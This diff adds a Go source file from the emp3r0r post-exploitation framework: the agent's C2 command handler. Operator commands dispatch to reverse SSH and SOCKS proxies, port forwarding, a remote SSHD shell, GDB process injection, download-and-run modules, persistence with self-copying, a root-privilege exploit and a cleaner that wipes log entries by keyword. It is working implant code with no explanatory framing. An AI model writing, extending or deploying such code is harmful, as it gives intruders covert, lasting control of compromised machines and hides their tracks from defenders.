@@ -1,0 +1,284 @@
+package agent
+
+import (
+	"context"
+	"encoding/json"
+	"fmt"
+	"log"
+	"os"
+	"strconv"
+	"time"
+
+	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/tun"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
+)
+
+func C2CommandsHandler(cmdSlice []string) (out string) {
+	var err error
+
+	switch cmdSlice[0] {
+
+	// stat file
+
+	case emp3r0r_data.C2CmdStat:
+		if len(cmdSlice) < 2 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+
+		path := cmdSlice[1]
+		fi, err := os.Stat(path)
+		if err != nil || fi == nil {
+			out = fmt.Sprintf("cant stat file %s: %v", path, err)
+			return
+		}
+		fstat := &util.FileStat{}
+		fstat.Name = util.FileBaseName(path)
+		fstat.Size = fi.Size()
+		fstat.Checksum = tun.SHA256SumFile(path)
+		fstat.Permission = fi.Mode().String()
+		fiData, err := json.Marshal(fstat)
+		out = string(fiData)
+		if err != nil {
+			out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
+		}
+		return
+
+	case emp3r0r_data.C2CmdReverseProxy:
+		// reverse proxy
+		if len(cmdSlice) != 2 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		addr := cmdSlice[1]
+		out = "Reverse proxy for " + addr + " finished"
+
+		hasInternet := tun.HasInternetAccess()
+		isProxyOK := tun.IsProxyOK(emp3r0r_data.AgentProxy)
+		if !hasInternet && !isProxyOK {
+			out = "We dont have any internet to share"
+		}
+		for p, cancelfunc := range ReverseConns {
+			if addr == p {
+				cancelfunc() // cancel existing connection
+			}
+		}
+		addr += ":" + emp3r0r_data.ReverseProxyPort
+		ctx, cancel := context.WithCancel(context.Background())
+		if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
+			out = err.Error()
+		}
+		return
+
+	case emp3r0r_data.C2CmdLPE:
+		// LPE helper
+		// !lpe script_name
+		if len(cmdSlice) < 2 {
+			log.Printf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("args error: %s", cmdSlice)
+			return
+		}
+
+		helper := cmdSlice[1]
+		out = lpeHelper(helper)
+		return
+
+	case emp3r0r_data.C2CmdSSHD:
+		// sshd server
+		// !sshd id shell port args
+		log.Printf("Got sshd request: %s", cmdSlice)
+		if len(cmdSlice) < 3 {
+			log.Printf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("args error: %s", cmdSlice)
+			return
+		}
+		shell := cmdSlice[1]
+		port := cmdSlice[2]
+		args := cmdSlice[3:]
+		go func() {
+			err = SSHD(shell, port, args)
+			if err != nil {
+				log.Printf("Failed to start SSHD: %v", err)
+			}
+		}()
+		out = "success"
+		for !tun.IsPortOpen("127.0.0.1", port) {
+			time.Sleep(100 * time.Millisecond)
+			if err != nil {
+				out = fmt.Sprintf("sshd failed to start: %v", err)
+				break
+			}
+		}
+		return
+
+		// proxy server
+	case emp3r0r_data.C2CmdProxy:
+		if len(cmdSlice) != 3 {
+			log.Printf("args error: %s", cmdSlice)
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		log.Printf("Got proxy request: %s", cmdSlice)
+		addr := cmdSlice[2]
+		err = Socks5Proxy(cmdSlice[1], addr)
+		if err != nil {
+			log.Printf("Failed to start Socks5Proxy: %v", err)
+		}
+		return
+
+		// port fwd
+		// cmd format: !port_fwd [to/listen] [shID] [operation]
+	case emp3r0r_data.C2CmdPortFwd:
+		if len(cmdSlice) != 4 {
+			log.Printf("Invalid command: %v", cmdSlice)
+			return
+		}
+		switch cmdSlice[3] {
+		case "stop":
+			sessionID := cmdSlice[1]
+			pf, exist := PortFwds[sessionID]
+			if exist {
+				pf.Cancel()
+				log.Printf("port mapping %s stopped", pf.Addr)
+				break
+			}
+			log.Printf("port mapping %s not found", pf.Addr)
+		case "reverse":
+			go func() {
+				addr := cmdSlice[1]
+				sessionID := cmdSlice[2]
+				err = PortFwd(addr, sessionID, true)
+				if err != nil {
+					log.Printf("PortFwd (reverse) failed: %v", err)
+				}
+			}()
+		case "on":
+			go func() {
+				to := cmdSlice[1]
+				sessionID := cmdSlice[2]
+				err = PortFwd(to, sessionID, false)
+				if err != nil {
+					log.Printf("PortFwd failed: %v", err)
+				}
+			}()
+		default:
+		}
+
+		return
+
+		// delete_portfwd
+	case emp3r0r_data.C2CmdDeletePortFwd:
+		if len(cmdSlice) != 2 {
+			return
+		}
+		for id, session := range PortFwds {
+			if id == cmdSlice[1] {
+				session.Cancel()
+			}
+		}
+		return
+
+		// GDB inject
+	case emp3r0r_data.C2CmdInject:
+		if len(cmdSlice) != 3 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		out = fmt.Sprintf("%s: success", cmdSlice[1])
+		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
+		if err != nil {
+			log.Print("Invalid pid")
+		}
+		err = InjectorHandler(int(pid), cmdSlice[1])
+		if err != nil {
+			out = "failed: " + err.Error()
+		}
+		return
+
+		// download utils
+	case emp3r0r_data.C2CmdUtils:
+		out = VaccineHandler()
+		return
+
+		// download a module and run it
+	case emp3r0r_data.C2CmdCustomModule:
+		if len(cmdSlice) != 3 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		out = moduleHandler(cmdSlice[1], cmdSlice[2])
+		return
+
+		// persistence
+	case emp3r0r_data.C2CmdPersistence:
+		if len(cmdSlice) != 2 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		out = "Success"
+		SelfCopy()
+		if cmdSlice[1] == "all" {
+			err = PersistAllInOne()
+			if err != nil {
+				log.Print(err)
+				out = fmt.Sprintf("Result: %v", err)
+			}
+		} else {
+			out = "No such method available"
+			if method, exists := PersistMethods[cmdSlice[1]]; exists {
+				out = "Success"
+				err = method()
+				if err != nil {
+					log.Println(err)
+					out = fmt.Sprintf("Result: %v", err)
+				}
+			}
+		}
+		return
+
+		// get_root
+	case emp3r0r_data.C2CmdGetRoot:
+		if os.Geteuid() == 0 {
+			out = "You already have root!"
+		} else {
+			err = GetRoot()
+			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
+			if err == nil {
+				out = "Got root!"
+			}
+		}
+		return
+
+		// upgrade
+	case emp3r0r_data.C2CmdUpdateAgent:
+		if len(cmdSlice) != 2 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+
+		out = "Done"
+		checksum := cmdSlice[1]
+		err = Upgrade(checksum)
+		if err != nil {
+			out = err.Error()
+		}
+		return
+
+		// log cleaner
+	case emp3r0r_data.C2CmdCleanLog:
+		if len(cmdSlice) != 2 {
+			out = fmt.Sprintf("args error: %v", cmdSlice)
+			return
+		}
+		keyword := cmdSlice[1]
+		out = "Done"
+		err = CleanAllByKeyword(keyword)
+		if err != nil {
+			out = err.Error()
+		}
+		return
+	}
+
+	return fmt.Sprintf("Unknown command %v", cmdSlice)
+}
